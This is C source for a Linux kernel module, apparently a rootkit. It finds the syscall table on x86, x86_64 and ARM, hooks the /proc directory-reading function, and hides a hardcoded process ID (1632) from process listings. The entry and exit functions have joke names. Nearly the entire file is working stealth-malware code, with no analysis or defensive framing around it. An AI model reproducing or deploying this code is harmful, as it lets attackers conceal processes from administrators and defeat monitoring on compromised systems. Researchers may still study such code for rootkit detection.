#include "common.h"
#include <linux/capability.h>
#include <linux/cred.h>
#include <asm/uaccess.h>
#include <linux/proc_fs.h>
#include <linux/net.h>
#include <linux/in.h>
#include <net/tcp.h>
#include <net/udp.h>
#include <linux/init.h>

#define TMPSZ 150

static int (*o_proc_readdir)(struct file *file, void *dirent, filldir_t filldir);
static int (*o_proc_filldir)(void *__buf, const char *name, int namelen, loff_t offset, u64 ino, unsigned d_type);


unsigned long *sys_call_table;
unsigned long *ia32_sys_call_table;

struct s_proc_args {
    unsigned short pid;
};

struct hidden_proc {
    unsigned short pid;
    struct list_head list;
};

LIST_HEAD(hidden_procs);

struct {
    unsigned short limit;
    unsigned long base;
} __attribute__ ((packed))idtr;

struct {
    unsigned short off1;
    unsigned short sel;
    unsigned char none, flags;
    unsigned short off2;
} __attribute__ ((packed))idt;

#if defined(_CONFIG_X86_)
// Phrack #58 0x07; sd, devik
unsigned long *find_sys_call_table ( void )
{
    char **p;
    unsigned long sct_off = 0;
    unsigned char code[255];

    asm("sidt %0":"=m" (idtr));
    memcpy(&idt, (void *)(idtr.base + 8 * 0x80), sizeof(idt));
    sct_off = (idt.off2 << 16) | idt.off1;
    memcpy(code, (void *)sct_off, sizeof(code));

    p = (char **)memmem(code, sizeof(code), "\xff\x14\x85", 3);

    if ( p )
        return *(unsigned long **)((char *)p + 3);
    else
        return NULL;
}
#elif defined(_CONFIG_X86_64_)
// http://bbs.chinaunix.net/thread-2143235-1-1.html
unsigned long *find_sys_call_table ( void )
{
    char **p;
    unsigned long sct_off = 0;
    unsigned char code[512];

    rdmsrl(MSR_LSTAR, sct_off);
    memcpy(code, (void *)sct_off, sizeof(code));

    p = (char **)memmem(code, sizeof(code), "\xff\x14\xc5", 3);

    if ( p )
    {
        unsigned long *sct = *(unsigned long **)((char *)p + 3);

        // Stupid compiler doesn't want to do bitwise math on pointers
        sct = (unsigned long *)(((unsigned long)sct & 0xffffffff) | 0xffffffff00000000);

        return sct;
    }
    else
        return NULL;
}

// Obtain sys_call_table on amd64; pouik
unsigned long *find_ia32_sys_call_table ( void )
{
    char **p;
    unsigned long sct_off = 0;
    unsigned char code[512];

    asm("sidt %0":"=m" (idtr));
    memcpy(&idt, (void *)(idtr.base + 16 * 0x80), sizeof(idt));
    sct_off = (idt.off2 << 16) | idt.off1;
    memcpy(code, (void *)sct_off, sizeof(code));

    p = (char **)memmem(code, sizeof(code), "\xff\x14\xc5", 3);

    if ( p )
    {
        unsigned long *sct = *(unsigned long **)((char *)p + 3);

        // Stupid compiler doesn't want to do bitwise math on pointers
        sct = (unsigned long *)(((unsigned long)sct & 0xffffffff) | 0xffffffff00000000);

        return sct;
    }
    else
        return NULL;
}
#else // ARM
// Phrack #68 0x06; dong-hoon you
unsigned long *find_sys_call_table ( void )
{
	void *swi_addr = (long *)0xffff0008;
	unsigned long offset, *vector_swi_addr;

	offset = ((*(long *)swi_addr) & 0xfff) + 8;
	vector_swi_addr = *(unsigned long **)(swi_addr + offset);

	while ( vector_swi_addr++ )
		if( ((*(unsigned long *)vector_swi_addr) & 0xfffff000) == 0xe28f8000 )
        {
			offset = ((*(unsigned long *)vector_swi_addr) & 0xfff) + 8;
			return vector_swi_addr + offset;
		}

	return NULL;
}
#endif



void *get_vfs_readdir ( const char *path )
{
    void *ret;
    struct file *filep;

    if ( (filep = filp_open(path, O_RDONLY, 0)) == NULL )
        return NULL;

    ret = filep->f_op->readdir;

    filp_close(filep, 0);

    return ret;
}

static int n_proc_filldir( void *__buf, const char *name, int namelen, loff_t offset, u64 ino, unsigned d_type )
{
    struct hidden_proc *hp;
    char *endp;
    long pid;

    pid = simple_strtol(name, &endp, 10);

    list_for_each_entry ( hp, &hidden_procs, list )
        if ( pid == hp->pid )
            return 0;

    return o_proc_filldir(__buf, name, namelen, offset, ino, d_type);
}

int n_proc_readdir ( struct file *file, void *dirent, filldir_t filldir )
{
    int ret;

    o_proc_filldir = filldir;

    hijack_pause(o_proc_readdir);
    ret = o_proc_readdir(file, dirent, &n_proc_filldir);
    hijack_resume(o_proc_readdir);

    return ret;
}



void hide_proc ( unsigned short pid )
{
    struct hidden_proc *hp;

    hp = kmalloc(sizeof(*hp), GFP_KERNEL);
    if ( ! hp )
        return;

    hp->pid = pid;

    list_add(&hp->list, &hidden_procs);
}

void unhide_proc ( unsigned short pid )
{
    struct hidden_proc *hp;

    list_for_each_entry ( hp, &hidden_procs, list )
    {
        if ( pid == hp->pid )
        {
            list_del(&hp->list);
            kfree(hp);
            break;
        }
    }
}

static int __init i_solemnly_swear_that_i_am_up_to_no_good ( void )
{

    #if defined(_CONFIG_X86_64_)
    ia32_sys_call_table = find_ia32_sys_call_table();
        #if __DEBUG__
    printk("ia32_sys_call_table obtained at %p\n", ia32_sys_call_table);
        #endif
    #endif

    sys_call_table = find_sys_call_table();

    #if __DEBUG__
    printk("sys_call_table obtained at %p\n", sys_call_table);
    #endif

    /* Hook /proc for hiding processes */
    o_proc_readdir = get_vfs_readdir("/proc");
    hijack_start(o_proc_readdir, &n_proc_readdir);

	
	#if __DEBUG__
	printk("Hiding PID %hu\n", 1632);
	#endif

	hide_proc(1632);



    return 0;
}

static void __exit mischief_managed ( void )
{

    hijack_stop(o_proc_readdir);
}

module_init(i_solemnly_swear_that_i_am_up_to_no_good);
module_exit(mischief_managed);

MODULE_LICENSE("GPL");


